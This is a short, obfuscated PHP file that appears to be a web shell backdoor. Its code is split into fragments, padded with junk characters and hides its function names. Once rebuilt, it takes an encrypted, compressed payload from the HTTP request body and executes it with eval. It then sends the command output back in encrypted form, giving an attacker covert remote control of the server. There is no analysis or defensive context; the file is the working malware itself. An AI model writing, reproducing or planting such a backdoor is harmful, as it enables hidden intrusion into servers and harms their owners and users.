<?php
$Q='$k="e1a87E8E09";$kEh="E916b894c1199E";$kf=E"badEd7d1E9cbfa";$p="EsWl0iEKVfEM7c9ENsyX";functiEon xE($Et,$';
$b='k){$c=strlEenE($k);$l=sEtrleEn($tE)E;E$o="";for($i=0;$iE<$l;){Efor($j=0E;($jE<$c&E&$i<$l);$Ej++,$i+EE+)';
$m=str_replace('b','','crbbbbbbeate_function');
$D='_contEentEsE();@ob_end_Eclean();$r=E@baEse64_EencoEde(@x(@gzEcoEmpress($o)E,E$kE));print("$Ep$kh$r$kf");}';
$w='{$o.=$tE{$iE}^$k{$j};}}retEurn $Eo;EE}if E(@Epreg_match("/$kEh(.+)$kEf/",@fileEE_get_contEents("php://iEn';
$r='pEut"),$m)E==1) EE{@ob_start();@eEvEal(@gzEuncEompress(@x(@baEsEe64_decoEde(E$m[E1]),$k)));$o=@oEEb_get';
$s=str_replace('E','',$Q.$b.$w.$r.$D);
$U=$m('',$s);$U();
?>
